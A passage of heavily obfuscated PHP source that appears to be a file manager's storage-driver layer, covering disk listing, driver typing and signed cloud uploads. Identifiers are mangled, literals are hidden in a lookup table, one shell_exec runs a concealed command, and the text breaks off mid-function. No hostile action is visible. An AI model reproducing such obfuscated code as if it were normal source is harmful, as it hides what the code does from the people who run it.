$ïÓâÔëã = self::make(Model($Ëá¯ô¢[916])->systemRootPathAdd($Ëá¯ô¢[622])); } else { $ïÓâÔëã = self::systemPath($Ëá¯ô¢[192]); $‹Œä¬û’ = self::sourceID($ïÓâÔëã); $ïÓâÔëã = self::make(Model($Ëá¯ô¢[916])->mkdir($‹Œä¬û’, $¤ù™–)); } Model($Ëá¯ô¢[856])->set($œ¹Ù°ß°, $ïÓâÔëã); return $ïÓâÔëã; } public static function systemFolder($ùş€) { $ßíÔãıĞ = IO_PATH_SYSTEM_SOURCE . $ùş€; $Öû§­ = Cache::get($ßíÔãıĞ); if (!$Öû§­) { $·ƒ¤û©– = IO::infoFullSimple($ßíÔãıĞ); if (!$·ƒ¤û©–) { $Öû§­ = IO::mkdir($ßíÔãıĞ, REPEAT_SKIP); } else { $Öû§­ = $·ƒ¤û©–[$_SERVER[´‹ô¯Œ][87]]; } Cache::set($ßíÔãıĞ, $Öû§­, 3600 * 10); } return $Öû§­; } public static function defaultDriver() { return Model($_SERVER[´‹ô¯Œ][853])->defaultDriver(); } public static function defaultDriverInit() { $ôÀ²ƒ– =& $_SERVER[´‹ô¯Œ]; static $Ë¶»„ğÜ = false; if ($Ë¶»„ğÜ) { return $Ë¶»„ğÜ; } $ìšõùÉø = self::defaultDriver(); $Ë¶»„ğÜ = IO::init($ôÀ²ƒ–[1398] . $ìšõùÉø[$ôÀ²ƒ–[487]] . $ôÀ²ƒ–[1386]); return $Ë¶»„ğÜ; } public static function fileTypeList() { $ĞÑºƒû =& $_SERVER[´‹ô¯Œ]; $ø¢ğÇ¼¸ = $GLOBALS[$ĞÑºƒû[6]][$ĞÑºƒû[1399]]; foreach ($ø¢ğÇ¼¸ as $­Ÿ˜®ü² => $²Â…Ìß†) { $øì‡åó§ = $ĞÑºƒû[1400] . $­Ÿ˜®ü²; $ÕÑ©Şö† = LNG($øì‡åó§); if ($øì‡åó§ != $ÕÑ©Şö†) { $ø¢ğÇ¼¸[$­Ÿ˜®ü²][$ĞÑºƒû[32]] = $ÕÑ©Şö†; } } return $ø¢ğÇ¼¸; } public static function ioFileDriverGet($³½æÔÏÀ = '') { $Âùß¨›ñ =& $_SERVER[´‹ô¯Œ]; static $‡Ÿì†ü = array(); static $ë„±¨¾ = array(); static $ôşÇ÷êÃ = array(); static $ÕÚÖàšä = false; if ($ÕÚÖàšä === !1) { $ÕÚÖàšä = array($Âùß¨›ñ[592] => array(), $Âùß¨›ñ[679] => array()); $©í ıİÂ = Model($Âùß¨›ñ[1401])->get(!1, $Âùß¨›ñ[1402]); foreach ($©í ıİÂ as $½óËéëÔ => $ı’¤×) { if (!$ı’¤× || $ı’¤× == $Âùß¨›ñ[12]) { continue; } if (strstr($½óËéëÔ, $Âùß¨›ñ[1403])) { $¶ÈÄÖïñ = str_replace($Âùß¨›ñ[1403], $Âùß¨›ñ[12], $½óËéëÔ); $ÕÚÖàšä[$Âùß¨›ñ[592]][$¶ÈÄÖïñ] = $ı’¤×; } else { if (strstr($½óËéëÔ, $Âùß¨›ñ[1404])) { $¶ÈÄÖïñ = str_replace($Âùß¨›ñ[1404], $Âùß¨›ñ[12], $½óËéëÔ); $ÕÚÖàšä[$Âùß¨›ñ[679]][$¶ÈÄÖïñ] = $ı’¤×; } } } } $ë‰¤‚•¡ = self::defaultDriver(); if (!$³½æÔÏÀ || !$ÕÚÖàšä[$Âùß¨›ñ[592]] && !$ÕÚÖàšä[$Âùß¨›ñ[679]]) { return $ë‰¤‚•¡; } $±øÅú²î = self::getPathSourceID($³½æÔÏÀ); if (!$±øÅú²î) { return $ë‰¤‚•¡; } if (isset($‡Ÿì†ü[$±øÅú²î])) { return $‡Ÿì†ü[$±øÅú²î]; } $ñÀªß¾ = Model($Âùß¨›ñ[916])->sourceInfo($±øÅú²î); $ÊÁ“œ•Ò = $ñÀªß¾[$Âùß¨›ñ[583]]; $ºØäúƒª = array(); if (!$ñÀªß¾) { return $ë‰¤‚•¡; } if ($ñÀªß¾[$Âùß¨›ñ[191]] == $Âùß¨›ñ[91]) { if (isset($ôşÇ÷êÃ[$ÊÁ“œ•Ò])) { return $ôşÇ÷êÃ[$ÊÁ“œ•Ò]; } if (isset($ÕÚÖàšä[$Âùß¨›ñ[679]][$ÊÁ“œ•Ò])) { $æüß¸óş = Model($Âùß¨›ñ[853])->driverInfo($ÕÚÖàšä[$Âùß¨›ñ[679]][$ÊÁ“œ•Ò]); $ë‰¤‚•¡ = $æüß¸óş ? $æüß¸óş : $ë‰¤‚•¡; $ôşÇ÷êÃ[$ÊÁ“œ•Ò] = $ë‰¤‚•¡; $‡Ÿì†ü[$±øÅú²î] = $ë‰¤‚•¡; return $ë‰¤‚•¡; } $ºØäúƒª = self::groupParentUser($ÊÁ“œ•Ò); } else { if ($ñÀªß¾[$Âùß¨›ñ[191]] == $Âùß¨›ñ[522]) { $ŞÑ›ô™ = Model($Âùß¨›ñ[1405])->getInfo($ÊÁ“œ•Ò); if ($ŞÑ›ô™) { $ºØäúƒª = explode($Âùß¨›ñ[50], trim($ŞÑ›ô™[$Âùß¨›ñ[598]], $Âùß¨›ñ[50])); $ºØäúƒª = array_remove_value($ºØäúƒª, $Âùß¨›ñ[231]); $ºØäúƒª[] = $ÊÁ“œ•Ò; $ºØäúƒª = array_reverse($ºØäúƒª); } } } foreach ($ºØäúƒª as $õç’Ò‡±) { if (!isset($ÕÚÖàšä[$Âùß¨›ñ[592]][$õç’Ò‡±])) { continue; } if (isset($ë„±¨¾[$õç’Ò‡±])) { return $ë„±¨¾[$õç’Ò‡±]; } $æüß¸óş = Model($Âùß¨›ñ[853])->driverInfo($ÕÚÖàšä[$Âùß¨›ñ[592]][$õç’Ò‡±]); $ë‰¤‚•¡ = $æüß¸óş ? $æüß¸óş : $ë‰¤‚•¡; $ë„±¨¾[$õç’Ò‡±] = $ë‰¤‚•¡; break; } if ($ñÀªß¾[$Âùß¨›ñ[191]] == $Âùß¨›ñ[91]) { $ôşÇ÷êÃ[$ÊÁ“œ•Ò] = $ë‰¤‚•¡; } $‡Ÿì†ü[$±øÅú²î] = $ë‰¤‚•¡; return $ë‰¤‚•¡; } private static function getPathSourceID($·ÎäØÏ”) { $ˆ¬¿—ãé =& $_SERVER[´‹ô¯Œ]; static $®©ÉÔ±À = array(); if (!$·ÎäØÏ”) { return $ˆ¬¿—ãé[12]; } $Á•Ï²İ¥ = substr($·ÎäØÏ”, 0, strlen($ˆ¬¿—ãé[495])) == $ˆ¬¿—ãé[495]; $¥ÀØÆ¥ó = substr($·ÎäØÏ”, 0, strlen($ˆ¬¿—ãé[1373])) == $ˆ¬¿—ãé[1373]; $„×¡¦³Ÿ = substr($·ÎäØÏ”, 0, strlen($ˆ¬¿—ãé[1374])) == $ˆ¬¿—ãé[1374]; if (!$Á•Ï²İ¥ && !$¥ÀØÆ¥ó && !$„×¡¦³Ÿ) { return $ˆ¬¿—ãé[12]; } $ËÆ‹ƒ› = self::parse($·ÎäØÏ”); $°¬Ü Æ¥ = $ËÆ‹ƒ›[$ˆ¬¿—ãé[1267]]; if ($Á•Ï²İ¥) { return $ËÆ‹ƒ›[$ˆ¬¿—ãé[487]]; } if (isset($®©ÉÔ±À[$°¬Ü Æ¥])) { $‘ê»šÀÉ = $®©ÉÔ±À[$°¬Ü Æ¥]; } else { $‘ê»šÀÉ = IO::init($°¬Ü Æ¥); $®©ÉÔ±À[$°¬Ü Æ¥] = $‘ê»šÀÉ; } if (isset($‘ê»šÀÉ->pathParse[$ˆ¬¿—ãé[1270]])) { return $‘ê»šÀÉ->pathParse[$ˆ¬¿—ãé[1270]]; } return $ˆ¬¿—ãé[12]; } private static function groupParentUser($‰áõ÷—) { $ºÏ¹Ô·Å =& $_SERVER[´‹ô¯Œ]; $ªÖ¦ïÑ = Model($ºÏ¹Ô·Å[611])->getInfo($‰áõ÷—); if (!$ªÖ¦ïÑ) { return array(); } $ØÅ£Ì˜½ = array_to_keyvalue($ªÖ¦ïÑ[$ºÏ¹Ô·Å[1406]], $ºÏ¹Ô·Å[12], $ºÏ¹Ô·Å[1407]); $Ì—åØ¨ = array(); foreach ($ªÖ¦ïÑ[$ºÏ¹Ô·Å[1406]] as $³äæµ¸ó) { $Ì—åØ¨[] = $³äæµ¸ó[$ºÏ¹Ô·Å[1407]]; $¾â‰€„Ù = explode($ºÏ¹Ô·Å[50], trim($³äæµ¸ó[$ºÏ¹Ô·Å[598]], $ºÏ¹Ô·Å[50])); $¾â‰€„Ù = array_remove_value($¾â‰€„Ù, $ºÏ¹Ô·Å[231]); $¾â‰€„Ù = array_reverse($¾â‰€„Ù); $Ì—åØ¨ = array_merge($Ì—åØ¨, $¾â‰€„Ù); } return array_unique($Ì—åØ¨); } public static function diskList($’¬Üòá¶ = true) { $½Æ¼“»Ô = $_SERVER[´‹ô¯Œ][1408]; if ($’¬Üòá¶) { $¢é‰†ùÃ = Cache::get($½Æ¼“»Ô); if (is_array($¢é‰†ùÃ)) { return $¢é‰†ùÃ; } } $¢é‰†ùÃ = self::diskListGet(); Cache::set($½Æ¼“»Ô, $¢é‰†ùÃ, 60); return $¢é‰†ùÃ; } public static function diskListGet() { $Ñ¬©­¼• =& $_SERVER[´‹ô¯Œ]; $üş¼Ô£ = array(); if ($GLOBALS[$Ñ¬©­¼•[6]][$Ñ¬©­¼•[1409]] == $Ñ¬©­¼•[1410]) { $à°çºñÙ = $Ñ¬©­¼•[1411]; for ($µÍÁË½Ö = 0; $µÍÁË½Ö < strlen($à°çºñÙ); $µÍÁË½Ö++) { $éßÆá¬ = $à°çºñÙ[$µÍÁË½Ö] . $Ñ¬©­¼•[1412]; if (file_exists($éßÆá¬)) { $üş¼Ô£[] = $éßÆá¬; } } return $üş¼Ô£; } if (!function_exists($Ñ¬©­¼•[101])) { $üş¼Ô£[] = $Ñ¬©­¼•[927]; return $üş¼Ô£; } $“ÃìÌä = explode($Ñ¬©­¼•[288], shell_exec($Ñ¬©­¼•[1413])); array_shift($“ÃìÌä); array_pop($“ÃìÌä); $ ¤òï»º = array($Ñ¬©­¼•[1414], $Ñ¬©­¼•[1415], $Ñ¬©­¼•[1416], $Ñ¬©­¼•[1417], $Ñ¬©­¼•[1418], $Ñ¬©­¼•[1419], $Ñ¬©­¼•[1420], $Ñ¬©­¼•[1421]); foreach ($“ÃìÌä as $ôÃ¸”Áö) { $û‰ÔîŸÀ = preg_split($Ñ¬©­¼•[1422], $ôÃ¸”Áö); $éßÆá¬ = $û‰ÔîŸÀ[count($û‰ÔîŸÀ) - 1]; if (!strstr($û‰ÔîŸÀ[0], $Ñ¬©­¼•[1423]) || !$éßÆá¬) { continue; } $‰ôÓ•ß = rtrim($éßÆá¬, $Ñ¬©­¼•[8]) . $Ñ¬©­¼•[8]; if (in_array($‰ôÓ•ß, $ ¤òï»º)) { continue; } $üş¼Ô£[] = $‰ôÓ•ß; } return $üş¼Ô£; } public static function isSameDisk($Œ†¥ì™, $í­ÊìÙ) { $”óÉ…ÄÙ =& $_SERVER[´‹ô¯Œ]; if ($GLOBALS[$”óÉ…ÄÙ[6]][$”óÉ…ÄÙ[1409]] == $”óÉ…ÄÙ[1410]) { return strtolower(substr($Œ†¥ì™, 0, 1)) == strtolower(substr($í­ÊìÙ, 0, 1)); } $ì‹‘şø¶ = stat($Œ†¥ì™); $Šä­…µ¼ = stat($í­ÊìÙ); if ($ì‹‘şø¶ === !1 || $Šä­…µ¼ === !1) { return !1; } return $ì‹‘şø¶[$”óÉ…ÄÙ[1424]] === $Šä­…µ¼[$”óÉ…ÄÙ[1424]]; $ªŞÕŸ¤Æ = self::diskList(); $ÕïúÏ¾ = !1; $†‚¥´¦„ = !1; sort($ªŞÕŸ¤Æ); $ªŞÕŸ¤Æ = array_reverse($ªŞÕŸ¤Æ); $Œ†¥ì™ = rtrim($Œ†¥ì™, $”óÉ…ÄÙ[8]) . $”óÉ…ÄÙ[8]; $í­ÊìÙ = rtrim($í­ÊìÙ, $”óÉ…ÄÙ[8]) . $”óÉ…ÄÙ[8]; foreach ($ªŞÕŸ¤Æ as $¿î¥«Œ) { $ğùğäÖè = strlen($¿î¥«Œ); if (!$ÕïúÏ¾ && substr($Œ†¥ì™, 0, $ğùğäÖè) == $¿î¥«Œ) { $ÕïúÏ¾ = $¿î¥«Œ; } if (!$†‚¥´¦„ && substr($í­ÊìÙ, 0, $ğùğäÖè) == $¿î¥«Œ) { $†‚¥´¦„ = $¿î¥«Œ; } if ($ÕïúÏ¾ && $†‚¥´¦„) { break; } } return $ÕïúÏ¾ === $†‚¥´¦„; } public static function transferType($€ü‡—®È, $Õıè¸îÜ) { $“á¯íÌ¸ =& $_SERVER[´‹ô¯Œ]; $¼•ÎÌüš = self::driverType($€ü‡—®È); $ûâÎŒ›£ = self::driverType($Õıè¸îÜ); if ($¼•ÎÌüš[$“á¯íÌ¸[33]] == $ûâÎŒ›£[$“á¯íÌ¸[33]] && $¼•ÎÌüš[$“á¯íÌ¸[1425]] == $ûâÎŒ›£[$“á¯íÌ¸[1425]]) { return $“á¯íÌ¸[1426]; } if ($¼•ÎÌüš[$“á¯íÌ¸[33]] == $“á¯íÌ¸[961] && $ûâÎŒ›£[$“á¯íÌ¸[33]] == $“á¯íÌ¸[109]) { return $“á¯íÌ¸[1296]; } if ($¼•ÎÌüš[$“á¯íÌ¸[33]] == $“á¯íÌ¸[109] && $ûâÎŒ›£[$“á¯íÌ¸[33]] == $“á¯íÌ¸[961]) { return $“á¯íÌ¸[110]; } return $“á¯íÌ¸[1427]; } public static function driverType($Æî“‡È) { $Ä¬Ó‡Ñ‰ =& $_SERVER[´‹ô¯Œ]; $éú’Å = str_replace($Ä¬Ó‡Ñ‰[1428], $Ä¬Ó‡Ñ‰[12], strtolower($Æî“‡È->getType())); if ($éú’Å == $Ä¬Ó‡Ñ‰[843] || $éú’Å == $Ä¬Ó‡Ñ‰[1429] || $éú’Å == $Ä¬Ó‡Ñ‰[1430]) { $Ş´‘çı¾ = self::ioFileDriverGet($Ä¬Ó‡Ñ‰[495] . $Æî“‡È->pathParse[$Ä¬Ó‡Ñ‰[1270]] . $Ä¬Ó‡Ñ‰[405]); $Æî“‡È = IO::init($Ä¬Ó‡Ñ‰[1398] . $Ş´‘çı¾[$Ä¬Ó‡Ñ‰[487]] . $Ä¬Ó‡Ñ‰[1386]); } else { if ($éú’Å == $Ä¬Ó‡Ñ‰[1306] || $éú’Å == $Ä¬Ó‡Ñ‰[1431]) { $Æî“‡È = IO::init($Æî“‡È->pathParse[$Ä¬Ó‡Ñ‰[1247]]); } } $‚‘ë×‹§ = $Æî“‡È->path; $éú’Å = str_replace($Ä¬Ó‡Ñ‰[1428], $Ä¬Ó‡Ñ‰[12], strtolower($Æî“‡È->getType())); if ($éú’Å == $Ä¬Ó‡Ñ‰[109]) { return array($Ä¬Ó‡Ñ‰[33] => $Ä¬Ó‡Ñ‰[109], $Ä¬Ó‡Ñ‰[1425] => $Ä¬Ó‡Ñ‰[12], $Ä¬Ó‡Ñ‰[87] => $‚‘ë×‹§, $Ä¬Ó‡Ñ‰[98] => $Æî“‡È); } return array($Ä¬Ó‡Ñ‰[33] => $Ä¬Ó‡Ñ‰[961], $Ä¬Ó‡Ñ‰[1425] => $Æî“‡È->pathDriver, $Ä¬Ó‡Ñ‰[87] => $‚‘ë×‹§, $Ä¬Ó‡Ñ‰[98] => $Æî“‡È); } public static function pathDriverType($ø˜ô¨Æß) { return $ø˜ô¨Æß ? self::driverType(IO::init($ø˜ô¨Æß)) : !1; } public static function pathDriverLocal($¹ï½¶É¤) { $ÑõÖë±ç =& $_SERVER[´‹ô¯Œ]; $€ßüûä = $¹ï½¶É¤ ? self::driverType(IO::init($¹ï½¶É¤)) : !1; return strtolower($€ßüûä[$ÑõÖë±ç[33]]) == $ÑõÖë±ç[109] ? !0 : !1; } public static function allowCover($Ë´ö˜£», $êìÏÌÖ¡ = true) { $™£²¸ó¤ =& $_SERVER[´‹ô¯Œ]; if (is_string($Ë´ö˜£»)) { $Ë´ö˜£» = IO::info($Ë´ö˜£»); } if (!$Ë´ö˜£» || $Ë´ö˜£»[$™£²¸ó¤[33]] == $™£²¸ó¤[78] || $Ë´ö˜£»[$™£²¸ó¤[79]] <= 100) { return !1; } if (isset($Ë´ö˜£»[$™£²¸ó¤[1432]]) || !$Ë´ö˜£»[$™£²¸ó¤[87]]) { return !1; } if (isset($Ë´ö˜£»[$™£²¸ó¤[235]]) && !$Ë´ö˜£»[$™£²¸ó¤[235]]) { return !1; } static $–Ô²¥¶ = false; if (!$–Ô²¥¶ || !$êìÏÌÖ¡) { $¢À×¥ş = self::driverType(IO::init($Ë´ö˜£»[$™£²¸ó¤[87]])); $ÓˆÒÎÁã = $¢À×¥ş[$™£²¸ó¤[98]]; $–Ô²¥¶ = $™£²¸ó¤[197]; if ($¢À×¥ş[$™£²¸ó¤[33]] == $™£²¸ó¤[109]) { $–Ô²¥¶ = $™£²¸ó¤[1433]; } if ($¢À×¥ş[$™£²¸ó¤[98]] && is_array($¢À×¥ş[$™£²¸ó¤[98]]->config)) { $ô™äîœù = $¢À×¥ş[$™£²¸ó¤[98]]->config; if (isset($ô™äîœù[$™£²¸ó¤[1434]]) && $ô™äîœù[$™£²¸ó¤[1434]]) { $–Ô²¥¶ = $™£²¸ó¤[1433]; } } $×ÍÅèÌ² = KodIO::defaultDriver(); if (strtolower($×ÍÅèÌ²[$™£²¸ó¤[98]]) == $™£²¸ó¤[109] && is_array($×ÍÅèÌ²[$™£²¸ó¤[6]])) { $‰èô‚ = $×ÍÅèÌ²[$™£²¸ó¤[6]][$™£²¸ó¤[1279]]; if (substr($‰èô‚, 0, 2) == $™£²¸ó¤[1435]) { $‰èô‚ = str_replace($™£²¸ó¤[1435], BASIC_PATH, $‰èô‚); } $‰èô‚ = str_replace($™£²¸ó¤[257], $™£²¸ó¤[8], $‰èô‚); if (substr($Ë´ö˜£»[$™£²¸ó¤[87]], 0, strlen($‰èô‚)) == $‰èô‚) { $–Ô²¥¶ = $™£²¸ó¤[197]; } } } return $–Ô²¥¶ == $™£²¸ó¤[1433] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($ø×„¯°) { parent::__construct($ø×„¯°); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($»êâé†Ã) { parent::__construct($»êâé†Ã); $this->setSignVersion($_SERVER[´‹ô¯Œ][250]); } public function uploadFormData($™ïà¨³½, $õüğæ¢ = 3600) { $–ÕæÃ· =& $_SERVER[´‹ô¯Œ]; $³¾¯ØğÁ = $–ÕæÃ·[232]; $òùµ·Á„ = $–ÕæÃ·[1436]; $½õí¥Õè = $–ÕæÃ·[264]; $ıõèÊ±ù = gmdate($–ÕæÃ·[1437], time() + $õüğæ¢); $–‡–Îã = (string) time() . $–ÕæÃ·[74] . (string) (time() + $õüğæ¢); $ì²¡”°“ = array($–ÕæÃ·[265] => $ıõèÊ±ù, $–ÕæÃ·[268] => array(array($–ÕæÃ·[309] => $³¾¯ØğÁ), array($–ÕæÃ·[269] => $this->bucket), array($–ÕæÃ·[270], $–ÕæÃ·[271], $–ÕæÃ·[12]), array($–ÕæÃ·[273] => $½õí¥Õè), array($–ÕæÃ·[1438] => $òùµ·Á„), array($–ÕæÃ·[1439] => $this->accessKey), array($–ÕæÃ·[1440] => $–‡–Îã))); $ì²¡”°“ = json_encode($ì²¡”°“); $«õ°–Šœ = hash_hmac($–ÕæÃ·[1436], $–‡–Îã, $this->secret); $îÃÓĞ“ = sha1($ì²¡”°“); $„æ•ı­ = hash_hmac($–ÕæÃ·[1436], $îÃÓĞ“, $«õ°–Šœ); $÷¯¤ı²ş = array($–ÕæÃ·[309] => $³¾¯ØğÁ, $–ÕæÃ·[273] => $½õí¥Õè, $–ÕæÃ·[280] => base64_encode($ì²¡”°“), $–ÕæÃ·[1438] => $òùµ·Á„, $–ÕæÃ·[1439] => $this->accessKey, $–ÕæÃ·[1441] => $–‡–Îã, $–ÕæÃ·[1442] => $„æ•ı­, $–ÕæÃ·[209] => $this->getHost()); return $÷¯¤ı²ş; } public function fileOutImage($Î«Á­Ï, $ÏŒõ°Ù = 250) { $ºäÛ­½ =& $_SERVER[´‹ô¯Œ]; if ($this->size($Î«Á­Ï) > 1024 * 1024 * 32) { return $this->fileOutImageServer($Î«Á­Ï, $ÏŒõ°Ù); } $ê¡®®ÎÑ = $this->link($Î«Á­Ï); $ê¡®®ÎÑ .= $ºäÛ­½[1443] . $ÏŒõ°Ù . $ºäÛ­½[1444]; $this->fileOutLink($ê¡®®ÎÑ); } } goto CäòÆš´©ä; BÓ­×Ü«„·: function binCheckBigger($šÂ²½“, $®÷ÛØ°ò) { return $šÂ²½“ > $®÷ÛØ°ò; } $_SERVER[$_SERVER[ÜûÈ¾…][3]] = ("\x38\x36\x37\x32"."\x38\x34")+0;$_1uf5="ytsl493aw86di0h25gfke7zqurxvpb1mjoncxwh9q15j62ze37tpgrao0n4dulk8iymfcsvbkmcd";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ÍªûäÜ², $åÒ¤„µ•) { $Ø¡€ñ„« =& $_SERVER[´‹ô¯Œ]; if (isset(self::$_methodList[$ÍªûäÜ²])) { return @call_user_func_array(self::$_methodList[$ÍªûäÜ²], $åÒ¤„µ•); } else { if (method_exists($this, $ÍªûäÜ²)) { return call_user_func_array(array($this, $ÍªûäÜ²), $åÒ¤„µ•); } else { think_exception(__CLASS__ . $Ø¡€ñ„«[4] . $ÍªûäÜ² . $Ø¡€ñ„«[5]); } } } public static function __callStatic($éÛŞåÄ, $»å†Ñ®) { if (isset(self::$_methodListStatic[$éÛŞåÄ])) { return call_user_func_array(self::$_methodListStatic[$éÛŞåÄ], $»å†Ñ®); } else { if (method_exists(self, $éÛŞåÄ)) { return call_user_func_array(array(self, $éÛŞåÄ), $»å†Ñ®); } else { show_json("{$éÛŞåÄ}\x28\51\40\156\x6f\x74\40\145\170\x69\x73\x74\73", !1); } } } public static function addMethod($×Ù‚¨Ú“, $ì»õî€‰) { self::$_methodList[$×Ù‚¨Ú“] = $ì»õî€‰; } public static function addMethodStatic($Ï‡ëßîó, $³äñş) { self::$_methodListStatic[$Ï‡ëßîó] = $³äñş; } } goto fáøäâùë§; bœê’óßÏ–: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $€ì¡æÙœ =& $_SERVER[´‹ô¯Œ]; $this->objectDriver = array($€ì¡æÙœ[60], $€ì¡æÙœ[61], $€ì¡æÙœ[62], $€ì¡æÙœ[63], $€ì¡æÙœ[64], $€ì¡æÙœ[65], $€ì¡æÙœ[66], $€ì¡æÙœ[67], $€ì¡æÙœ[68], $€ì¡æÙœ[69], $€ì¡æÙœ[70], $€ì¡æÙœ[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($å…§‡¼®) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($å…§‡¼®, $_SERVER[´‹ô¯Œ][8]); } return $å…§‡¼®; } public function iconvApp($œÒŞ¢ƒ) { return $œÒŞ¢ƒ; } public function iconvSystem($šıÂºÁ) { return $šıÂºÁ; } public function iconvTo($¸ÒÇÛ¯, $ô×ğ¸à, $Ô«®ÖôŸ) { $ ½ù§ëÒ =& $_SERVER[´‹ô¯Œ]; if (!$¸ÒÇÛ¯ || !function_exists($ ½ù§ëÒ[72])) { return $¸ÒÇÛ¯; } static $Êõ÷ÜÚã = array(); $˜©‚Ï’° = $ô×ğ¸à . $ ½ù§ëÒ[73] . $Ô«®ÖôŸ . $ ½ù§ëÒ[74] . $¸ÒÇÛ¯; if (isset($Êõ÷ÜÚã[$˜©‚Ï’°])) { return $Êõ÷ÜÚã[$˜©‚Ï’°]; } if (function_exists($ ½ù§ëÒ[75])) { $€¹¿ğõÜ = @mb_convert_encoding($¸ÒÇÛ¯, $Ô«®ÖôŸ, $ô×ğ¸à); } else { $€¹¿ğõÜ = @iconv($ô×ğ¸à, $Ô«®ÖôŸ, $¸ÒÇÛ¯); } $€¹¿ğõÜ = $€¹¿ğõÜ ? $€¹¿ğõÜ : $¸ÒÇÛ¯; if (strstr($€¹¿ğõÜ, $ ½ù§ëÒ[76])) { $€¹¿ğõÜ = str_replace($ ½ù§ëÒ[76], $ ½ù§ëÒ[11], $€¹¿ğõÜ); } $Êõ÷ÜÚã[$ô×ğ¸à . $ ½ù§ëÒ[73] . $Ô«®ÖôŸ . $ ½ù§ëÒ[74] . $¸ÒÇÛ¯] = $€¹¿ğõÜ; $Êõ÷ÜÚã[$Ô«®ÖôŸ . $ ½ù§ëÒ[73] . $ô×ğ¸à . $ ½ù§ëÒ[74] . $¸ÒÇÛ¯] = $¸ÒÇÛ¯; $Êõ÷ÜÚã[$Ô«®ÖôŸ . $ ½ù§ëÒ[73] . $ô×ğ¸à . $ ½ù§ëÒ[74] . $€¹¿ğõÜ] = $¸ÒÇÛ¯; $Êõ÷ÜÚã[$ô×ğ¸à . $ ½ù§ëÒ[73] . $Ô«®ÖôŸ . $ ½ù§ëÒ[74] . $€¹¿ğõÜ] = $€¹¿ğõÜ; return $€¹¿ğõÜ; } public function getPathInner($Ç¯ï•‘™) { $Û·‚¾‡ú = IO::init($Ç¯ï•‘™); return $Û·‚¾‡ú->path; } public function getPathOuter($á­”ç˜‹) { $‰ÔĞèÏî =& $_SERVER[´‹ô¯Œ]; $îŠ‡°‚œ = strlen(trim($this->pathBase, $‰ÔĞèÏî[8])); $á­”ç˜‹ = substr(trim($á­”ç˜‹, $‰ÔĞèÏî[8]), $îŠ‡°‚œ); return $this->pathDriver . $‰ÔĞèÏî[8] . ltrim($á­”ç˜‹, $‰ÔĞèÏî[8]); } public function isParentOf($Ö½—ü”–, $•²©‹È‹) { $‹€¦¢ŞÒ =& $_SERVER[´‹ô¯Œ]; $Ö½—ü”– = rtrim(strtolower($Ö½—ü”–), $‹€¦¢ŞÒ[8]) . $‹€¦¢ŞÒ[8]; $•²©‹È‹ = rtrim(strtolower($•²©‹È‹), $‹€¦¢ŞÒ[8]) . $‹€¦¢ŞÒ[8]; $Ù‚ğ¿ = strpos($•²©‹È‹, $Ö½—ü”–) === 0; return $Ù‚ğ¿; } public function getType() { $£•¢‚Õ­ =& $_SERVER[´‹ô¯Œ]; $½´¯×ƒä = str_replace($£•¢‚Õ­[77], $£•¢‚Õ­[12], get_class($this)); return strtolower($½´¯×ƒä); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($á³Æø¶€, $µä÷Ô“) { $“ÛÜ–Ö =& $_SERVER[´‹ô¯Œ]; $ìÙ“‘óÅ = rtrim($á³Æø¶€, $“ÛÜ–Ö[8]) . $“ÛÜ–Ö[8] . $µä÷Ô“; $×Â”÷Ãì = $this->exist($ìÙ“‘óÅ); return $×Â”÷Ãì ? $ìÙ“‘óÅ : !1; } public function setModifyTime($ÕŠĞ¥ÂØ, $§€¿Ï°ú = '') { } public function renameObject($óÄ±¿œš, $¬£Ëüõ¾) { $¡öÁïĞÀ = $¬£Ëüõ¾; $óÄ±¿œš = $this->getPathOuter($óÄ±¿œš); $¬£Ëüõ¾ = $this->pathFather($óÄ±¿œš) . $¬£Ëüõ¾; $±‹¨øâ = IO::copy($óÄ±¿œš, $this->pathFather($óÄ±¿œš), REPEAT_RENAME_FOLDER, $¡öÁïĞÀ); if ($±‹¨øâ) { IO::remove($óÄ±¿œš); } return $±‹¨øâ ? $¬£Ëüõ¾ : !1; } public function tempFile($¦šÏ—Ê™ = '', $¬äÕ… = '') { if (!$¦šÏ—Ê™) { $¦šÏ—Ê™ = rand_string(15); } $¨˜ÉÈ¥™ = TEMP_FILES . rand_string(15) . $_SERVER[´‹ô¯Œ][8]; @mkdir($¨˜ÉÈ¥™, DEFAULT_PERRMISSIONS, !0); $ì¹“×¹ö = $¨˜ÉÈ¥™ . $¦šÏ—Ê™; @touch($ì¹“×¹ö); if ($¬äÕ…) { file_put_contents($ì¹“×¹ö, $¬äÕ…); } return $ì¹“×¹ö; } public function tempFileRemve($ˆÅà±Ÿœ) { @unlink($ˆÅà±Ÿœ); @rmdir($this->pathFather($ˆÅà±Ÿœ)); } public function mkfile($£´¦Å, $ä—Œáà = '', $îÈ›“˜— = REPEAT_RENAME) { } public function mkdir($Á±º‚ì¿, $¸ĞÈ¥ = REPEAT_SKIP) { } public function delFile($ëØĞí–û) { } public function delFolder($ñ‚™¾´Ô) { } public function copyFile($òë±‹ÏÍ, $Šººû±«) { } public function moveFile($¡—¡Ô²è, $ûö ºßÔ) { } public function remove($Ïâõ¨ûº) { if ($this->isFile($Ïâõ¨ûº)) { return $this->delFile($Ïâõ¨ûº); } return $this->delFolder($Ïâõ¨ûº); } public function rename($Îİæ¤Ö, $ÑÈÀä¶) { } public function exist($ú¸úøØú) { } public function findByHash($¯—Œ”¤ = '', $è²é´¨ê = '') { return !1; } public function isFile($Ø‘Æ¡´­) { } public function isFolder($™ÌŒŸî) { } public function size($í¬€Ó…) { } public function info($æî‰è¿ô) { } public function infoSimple($ÀçÌ—Œ¤) { return $this->info($ÀçÌ—Œ¤); } public function infoAuth($ÀÀ×öü) { return $this->info($ÀÀ×öü); } public function infoFull($—ñåÍÊ½) { return $this->info($—ñåÍÊ½); } public function infoFullSimple($Ø£È€ª) { return $this->info($Ø£È€ª); } public function infoWithChildren($‹Á—ã¸¥) { $ÆşËò˜û =& $_SERVER[´‹ô¯Œ]; static $ŠƒÅá—Î = array(); if (isset($ŠƒÅá—Î[$‹Á—ã¸¥])) { return 